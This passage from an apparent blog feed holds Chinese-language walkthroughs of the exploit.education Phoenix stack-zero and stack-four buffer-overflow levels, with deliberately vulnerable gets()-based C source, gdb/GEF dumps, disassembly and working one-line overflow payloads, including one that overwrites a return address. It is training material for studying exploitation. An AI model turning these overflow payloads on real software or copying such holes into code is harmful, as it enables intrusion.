class="string">&quot;%s\n&quot;</span>, BANNER);</span><br><span class="line"></span><br><span class="line">  locals.changeme = <span class="number">0</span>;</span><br><span class="line">  gets(locals.buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locals.changeme != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well done, the &#x27;changeme&#x27; variable has been changed!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">&quot;Uh oh, &#x27;changeme&#x27; has not yet been changed. Would you like to try &quot;</span></span><br><span class="line">        <span class="string">&quot;again?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>locals</code>结构体有两个成员，一个是64字节大小的<code>char</code>类型的<code>buffer</code>变量，一个是4字节大小的<a href="https://www.cnblogs.com/reality-soul/p/6140192.html">volatile</a> <code>int</code>类型的<code>changeme</code>变量。</p>
<p>程序首先会输出一句话，然后将<code>locals</code>结构体中的<code>changeme</code>成员赋值为<code>0</code>，然后通过使用<code>gets</code>函数获取用户输入，将内容写入<code>locals</code>结构体中的<code>buffer</code>中去。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">man gets</span></span><br><span class="line">...</span><br><span class="line">DESCRIPTION</span><br><span class="line">	...</span><br><span class="line">    The gets() function is equivalent to fgets() with an infinite size and a stream of stdin, except that the newline character (if any) is not stored in the string.  It is the caller&#x27;s responsibility to ensure that the input line, if any, is sufficiently short to fit in the string.</span><br><span class="line">...</span><br><span class="line">SECURITY CONSIDERATIONS</span><br><span class="line">     The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the calling program to reliably determine the length of the next incoming</span><br><span class="line">     line, the use of this function enables malicious users to arbitrarily change a running program&#x27;s functionality through a buffer overflow attack.  It is strongly suggested that the</span><br><span class="line">     fgets() function be used in all cases.  (See the FSA.)</span><br></pre></td></tr></table></figure>

<p><code>gets</code>函数没有检查输入的大小，就直接将输入写入到地址中，造成了bof。很简单的一个程序。过关方式是将<code>locals.changeme</code>改变。</p>
<p>使用GDB调试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-zero </span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">78 commands loaded for GDB 8.2.1 using Python engine 3.5</span><br><span class="line">[*] 2 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from stack-zero...(no debugging symbols found)...done.</span><br><span class="line">gef➤  start</span><br><span class="line">[+] Breaking at &#x27;&#123;&lt;text variable, no debug info&gt;&#125; 0x4005dd &lt;main&gt;&#x27;</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rbx   : 0x00007fffffffe668  →  0x00007fffffffe878  →  <span class="string">&quot;/opt/phoenix/amd64/stack-zero&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rdx   : 0x00007fffffffe678  →  0x00007fffffffe896  →  <span class="string">&quot;LC_ALL=en_US.UTF-8&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rsp   : 0x00007fffffffe610  →  0x0000000000000001</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rbp   : 0x00007fffffffe610  →  0x0000000000000001</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rsi   : 0x00007fffffffe668  →  0x00007fffffffe878  →  <span class="string">&quot;/opt/phoenix/amd64/stack-zero&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rdi   : 0x1</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rip   : 0x00000000004005e1  →  &lt;main+4&gt; sub rsp, 0x60</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r8    : 0x0000000000400672  →  &lt;_fini+0&gt; push rax</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r9    : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r10   : 0x00007ffff7dfa767  →  0x4c00636f6c6c616d (<span class="string">&quot;malloc&quot;</span>?)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r11   : 0x00007ffff7ffd9e0  →  0x00007ffff7d6b000  →  0x00010102464c457f</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r12   : 0x00007fffffffe678  →  0x00007fffffffe896  →  <span class="string">&quot;LC_ALL=en_US.UTF-8&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r13   : 0x00000000004005dd  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">eflags: [carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">cs: 0x0033 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x0000 <span class="variable">$es</span>: 0x0000 <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0000</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe610│+0x0000: 0x0000000000000001	 ← $rsp, $rbp</span><br><span class="line">0x00007fffffffe618│+0x0008: 0x00007ffff7d8fd62  →  &lt;__libc_start_main+54&gt; mov edi, eax</span><br><span class="line">0x00007fffffffe620│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007fffffffe628│+0x0018: 0x00007fffffffe660  →  0x0000000000000001</span><br><span class="line">0x00007fffffffe630│+0x0020: 0x0000000000000000</span><br><span class="line">0x00007fffffffe638│+0x0028: 0x00007ffff7ffdbc8  →  0x00007ffff7ffdbc8  →  [loop detected]</span><br><span class="line">0x00007fffffffe640│+0x0030: 0x0400000100003e00</span><br><span class="line">0x00007fffffffe648│+0x0038: 0x00000000004004a9  →   nop DWORD PTR [rax+0x0]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x4005d8 &lt;frame_dummy+40&gt; jmp    0x4004e0 &lt;register_tm_clones&gt;</span><br><span class="line">     0x4005dd &lt;main+0&gt;         push   rbp</span><br><span class="line">     0x4005de &lt;main+1&gt;         mov    rbp, rsp</span><br><span class="line"> →   0x4005e1 &lt;main+4&gt;         sub    rsp, 0x60</span><br><span class="line">     0x4005e5 &lt;main+8&gt;         mov    DWORD PTR [rbp-0x54], edi</span><br><span class="line">     0x4005e8 &lt;main+11&gt;        mov    QWORD PTR [rbp-0x60], rsi</span><br><span class="line">     0x4005ec &lt;main+15&gt;        mov    edi, 0x400680</span><br><span class="line">     0x4005f1 &lt;main+20&gt;        call   0x400440 &lt;puts@plt&gt;</span><br><span class="line">     0x4005f6 &lt;main+25&gt;        mov    DWORD PTR [rbp-0x10], 0x0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta prompt_">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;stack-zero&quot;</span>, stopped, reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta prompt_">[#</span><span class="language-bash">0] 0x4005e1 → main()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看一下汇编代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  disassemble</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004005dd &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00000000004005de &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">=&gt; 0x00000000004005e1 &lt;+4&gt;:	sub    rsp,0x60</span><br><span class="line">   0x00000000004005e5 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x54],edi</span><br><span class="line">   0x00000000004005e8 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x60],rsi</span><br><span class="line">   0x00000000004005ec &lt;+15&gt;:	mov    edi,0x400680</span><br><span class="line">   0x00000000004005f1 &lt;+20&gt;:	call   0x400440 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004005f6 &lt;+25&gt;:	mov    DWORD PTR [rbp-0x10],0x0 ;&lt;=====将changeme赋值为0</span><br><span class="line">   0x00000000004005fd &lt;+32&gt;:	lea    rax,[rbp-0x50] ;&lt;=====取栈上的一个地址，给RAX</span><br><span class="line">   0x0000000000400601 &lt;+36&gt;:	mov    rdi,rax ;&lt;=====RAX=RDI为gets的参数</span><br><span class="line">   0x0000000000400604 &lt;+39&gt;:	call   0x400430 &lt;gets@plt&gt; ;&lt;=====这里调用gets函数</span><br><span class="line">   0x0000000000400609 &lt;+44&gt;:	mov    eax,DWORD PTR [rbp-0x10] ;&lt;=====将changeme的值赋值给eax，在这里设置数点，来观察我们的输入在栈上是什么样子</span><br><span class="line">   0x000000000040060c &lt;+47&gt;:	test   eax,eax ;&lt;=====eax是否为0</span><br><span class="line">   0x000000000040060e &lt;+49&gt;:	je     0x40061c &lt;main+63&gt;</span><br><span class="line">   0x0000000000400610 &lt;+51&gt;:	mov    edi,0x4006d0</span><br><span class="line">   0x0000000000400615 &lt;+56&gt;:	call   0x400440 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040061a &lt;+61&gt;:	jmp    0x400626 &lt;main+73&gt;</span><br><span class="line">   0x000000000040061c &lt;+63&gt;:	mov    edi,0x400708</span><br><span class="line">   0x0000000000400621 &lt;+68&gt;:	call   0x400440 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400626 &lt;+73&gt;:	mov    edi,0x0</span><br><span class="line">   0x000000000040062b &lt;+78&gt;:	call   0x400450 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于中64位系统，参数的时候会依次使用<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>和<code>r9</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  break * 0x0000000000400609</span><br><span class="line">Breakpoint 1 at 0x400609</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Welcome to phoenix/stack-zero, brought to you by https://exploit.education</span><br><span class="line">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1 ;&lt;=====这里是我们的输入</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400609 in main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rax   : 0x00007fffffffe5c0  →  <span class="string">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMM[...]&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rbx   : 0x00007fffffffe668  →  0x00007fffffffe878  →  <span class="string">&quot;/opt/phoenix/amd64/stack-zero&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rcx   : 0x8080808080808080</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rdx   : 0x00007fffffffe668  →  0x00007fffffffe878  →  <span class="string">&quot;/opt/phoenix/amd64/stack-zero&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rsp   : 0x00007fffffffe5b0  →  0x00007fffffffe668  →  0x00007fffffffe878  →  <span class="string">&quot;/opt/phoenix/amd64/stack-zero&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rbp   : 0x00007fffffffe610  →  0x0000000000000001</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rsi   : 0xfefefefefefefeff</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rdi   : 0x00007fffffffe602  →  0x0000000000000000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rip   : 0x0000000000400609  →  &lt;main+44&gt; mov eax, DWORD PTR [rbp-0x10]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r8    : 0x00007fffffffe5c0  →  <span class="string">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMM[...]&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r9    : 0xa0a0a0a0a0a0a0a  (<span class="string">&quot;\n\n\n\n\n\n\n\n&quot;</span>?)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r10   : 0x8080808080808080</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r11   : 0x2</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r12   : 0x00007fffffffe678  →  0x00007fffffffe896  →  <span class="string">&quot;LC_ALL=en_US.UTF-8&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r13   : 0x00000000004005dd  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">eflags: [carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">cs: 0x0033 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x0000 <span class="variable">$es</span>: 0x0000 <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0000</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe5b0│+0x0000: 0x00007fffffffe668  →  0x00007fffffffe878  →  &quot;/opt/phoenix/amd64/stack-zero&quot;	 ← $rsp</span><br><span class="line">0x00007fffffffe5b8│+0x0008: 0x0000000100000000</span><br><span class="line">0x00007fffffffe5c0│+0x0010: &quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMM[...]&quot;	 ← $rax, $r8</span><br><span class="line">0x00007fffffffe5c8│+0x0018: &quot;CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOO[...]&quot;</span><br><span class="line">0x00007fffffffe5d0│+0x0020: &quot;EEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1&quot;</span><br><span class="line">0x00007fffffffe5d8│+0x0028: &quot;GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1&quot;</span><br><span class="line">0x00007fffffffe5e0│+0x0030: &quot;IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1&quot;</span><br><span class="line">0x00007fffffffe5e8│+0x0038: &quot;KKKKLLLLMMMMNNNNOOOOPPPP1&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x4005fd &lt;main+32&gt;        lea    rax, [rbp-0x50]</span><br><span class="line">     0x400601 &lt;main+36&gt;        mov    rdi, rax</span><br><span class="line">     0x400604 &lt;main+39&gt;        call   0x400430 &lt;gets@plt&gt;</span><br><span class="line"> →   0x400609 &lt;main+44&gt;        mov    eax, DWORD PTR [rbp-0x10]</span><br><span class="line">     0x40060c &lt;main+47&gt;        test   eax, eax</span><br><span class="line">     0x40060e &lt;main+49&gt;        je     0x40061c &lt;main+63&gt;</span><br><span class="line">     0x400610 &lt;main+51&gt;        mov    edi, 0x4006d0</span><br><span class="line">     0x400615 &lt;main+56&gt;        call   0x400440 &lt;puts@plt&gt;</span><br><span class="line">     0x40061a &lt;main+61&gt;        jmp    0x400626 &lt;main+73&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta prompt_">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;stack-zero&quot;</span>, stopped, reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta prompt_">[#</span><span class="language-bash">0] 0x400609 → main()</span></span><br><span class="line">gef➤  x/s $rbp-0x50 ;&lt;================查看我们的输入</span><br><span class="line">0x7fffffffe5c0:	&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1&quot;</span><br><span class="line">gef➤  x/s $rbp-0x10 ;&lt;================查看changeme在栈中的值</span><br><span class="line">0x7fffffffe600:	&quot;1&quot;</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Well done, the &#x27;changeme&#x27; variable has been changed!</span><br><span class="line">[Inferior 1 (process 2862) exited normally]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>OK，一句命令的话，就是这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:/opt/phoenix/amd64$ python -c &#x27;print &quot;A&quot;*64+&quot;1&quot;&#x27; | ./stack-zero </span><br><span class="line">Welcome to phoenix/stack-zero, brought to you by https://exploit.education</span><br><span class="line">Well done, the &#x27;changeme&#x27; variable has been changed!</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>gdb打开文件之后要<code>start</code>运行起来</li>
<li>gdb命令：<ul>
<li><code>disassemble</code>: 查看当前函数的汇编代码</li>
<li><code>break</code>: 设置数点，如果后面跟一个地址，加*</li>
<li><code>x/s $rbp-0x10</code>: 以字符串的格式查看[rbp-0x10]地址处的值</li>
<li><code>c</code>: continue，继续运行程序</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ExploitEducation</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit.education/stack-four</title>
    <url>/re/pwn/exploit-education-stack-four.html</url>
    <content><![CDATA[<p>这个关卡是一个标准的栈溢出的例子。</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-four, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The aim is to execute the function complete_level by modifying the</span></span><br><span class="line"><span class="comment"> * saved return address, and pointing it to the complete_level() function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Why were the apple and orange all alone? Because the bananna split.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BANNER \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;Welcome to &quot;</span> LEVELNAME <span class="string">&quot;, brought to you by https://exploit.education&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">complete_level</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you&#x27;ve finished &quot;</span> LEVELNAME <span class="string">&quot; :-) Well done!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">start_level</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="type">void</span> *ret;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;and will be returning to %p\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, BANNER);</span><br><span class="line">  start_level();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>main</code>调用<code>start_level</code>，<code>start_level</code>中有一个<code>gets</code>函数会千万<code>栈溢出</code>，利用溢出漏洞我们可以控制<code>RIP/EIP</code>，也就是程序执行流程。通过将<code>返回地址</code>覆盖成<code>complete_level</code>函数的地址，就过关了。</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先来看一下主要函数部分的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040061d &lt;complete_level&gt;:</span><br><span class="line">  40061d:	55                   	push   %rbp</span><br><span class="line">  40061e:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  400621:	bf f0 06 40 00       	mov    $0x4006f0,%edi</span><br><span class="line">  400626:	e8 55 fe ff ff       	callq  400480 &lt;puts@plt&gt;</span><br><span class="line">  40062b:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  400630:	e8 5b fe ff ff       	callq  400490 &lt;exit@plt&gt;</span><br><span class="line"></span><br><span class="line">0000000000400635 &lt;start_level&gt;:</span><br><span class="line">  400635:	55                   	push   %rbp</span><br><span class="line">  400636:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  400639:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  40063d:	48 8d 45 b0          	lea    -0x50(%rbp),%rax</span><br><span class="line">  400641:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  400644:	e8 27 fe ff ff       	callq  400470 &lt;gets@plt&gt;</span><br><span class="line">  400649:	48 8b 45 08          	mov    0x8(%rbp),%rax</span><br><span class="line">  40064d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">  400651:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">  400655:	48 89 c6             	mov    %rax,%rsi</span><br><span class="line">  400658:	bf 33 07 40 00       	mov    $0x400733,%edi</span><br><span class="line">  40065d:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400662:	e8 f9 fd ff ff       	callq  400460 &lt;printf@plt&gt;</span><br><span class="line">  400667:	90                   	nop</span><br><span class="line">  400668:	c9                   	leaveq </span><br><span class="line">  400669:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000040066a &lt;main&gt;:</span><br><span class="line">  40066a:	55                   	push   %rbp</span><br><span class="line">  40066b:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40066e:	48 83 ec 10          	sub    $0x10,%rsp</span><br><span class="line">  400672:	89 7d fc             	mov    %edi,-0x4(%rbp)</span><br><span class="line">  400675:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)</span><br><span class="line">  400679:	bf 50 07 40 00       	mov    $0x400750,%edi</span><br><span class="line">  40067e:	e8 fd fd ff ff       	callq  400480 &lt;puts@plt&gt;</span><br><span class="line">  400683:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400688:	e8 a8 ff ff ff       	callq  400635 &lt;start_level&gt;</span><br><span class="line">  40068d:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400692:	c9                   	leaveq </span><br><span class="line">  400693:	c3                   	retq   </span><br><span class="line">  400694:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40069b:	00 00 00 </span><br><span class="line">  40069e:	66 90                	xchg   %ax,%ax</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>call</code>汇编指令分为两个部分，</p>
<ol>
<li>将当前指令的下一条指令地址压入栈中</li>
<li>JMP（无条件跳转）到目标函数地址。</li>
</ol>
<p>在程序从<code>main</code>函数的<code>0x400688</code>处调用(<code>call</code>)<code>start_level</code>函数时，会先将<code>0x40068d</code>这个地址压入栈中，作为<code>返回地址</code>，以便执行完<code>start_level</code>之后程序再回到<code>main</code>函数继续执行。</p>
<p>来到<code>0x0400635</code>处的<code>start_level</code>函数，系统会保存<code>main</code>函数时的<code>RBP</code>，并通过提升栈顶(表现为将RSP减去一定字节)，为局部变量<code>buffer</code>和<code>ret</code>分配合适的空间。<code>buffer</code>为一个<code>char</code>类型的数组，所以长度为<code>64</code>字节；<code>ret</code>为地址类型的变量，所以在<code>64</code>位系统中长度为<code>8</code>个字节。理论计算应该分配<code>64+8=72</code>个字节。<br><code>但是出于地址对齐等原因，一般会比这个长度大小要大一些</code>，如本例子中就分配了<code>0x50 = 80</code>个字节的空间。</p>
<p>对于局部变量在调用栈中的分配，<code>一般</code>是按照定义顺序进行分配的，除非打开某些编译器优化选项。</p>
<p>综合上面的内容，我们可以认为<code>start_level</code>栈是这样的：</p>
<p>1554818156508.jpg<br><img src="/images/pasted-9.png" alt="upload successful"></p>
<p>当执行到<code>gets</code>函数时，栈顶地址作为<code>gets</code>的参数传入，所以我们的输入是从栈顶开始向下覆盖的。如果我们这时利用溢出将<code>ret to main</code>这个地址（返回地址）覆盖成<code>complete_level</code>函数的地址，那么<code>start_level</code>执行完毕后，想要返回<code>main</code>函数继续执行时，却因为我们已经更改了返回地址，去执行了<code>complete_level</code>函数。</p>
<p>那么接下来的事儿就简单了。<br>首先，<code>complete_level</code>函数的地址在上面已经看到，为<code>0x040061d</code>，那么为了覆盖返回地址(也就是图中<code>ret to main</code>的地址)，我们需要多少个字符填充呢？对，就是<code>0x50+8 = 88</code>个字节，后面跟上<code>0x040061d</code>，就完成过关。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user@phoenix-amd64:~$ python -c &quot;from pwn import *;print &#x27;A&#x27;*88+p64(0x040061d)&quot; | /opt/phoenix/amd64/stack-four </span><br><span class="line">Welcome to phoenix/stack-four, brought to you by https://exploit.education</span><br><span class="line">and will be returning to 0x40061d</span><br><span class="line">Congratulations, you&#x27;ve finished phoenix/stack-four :-) Well done!</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>要对调用栈的数据分布比较了解</li>
<li>理论计算不如看一下汇编代码，因为编译器可能由于优化、地址对齐等原因对栈的大小进行调整。</li>
</ol>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ExploitEducation</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit.education/stack-one</title>
    <url>/re/pwn/exploit-education-stack-one.html</url>
    <content><![CDATA[<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-one, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The aim is to change the contents of the changeme variable to 0x496c5962</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Did you hear about the kid napping at the local school?</span></span><br><span class="line"><span class="comment"> * It&#x27;s okay, they woke up.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 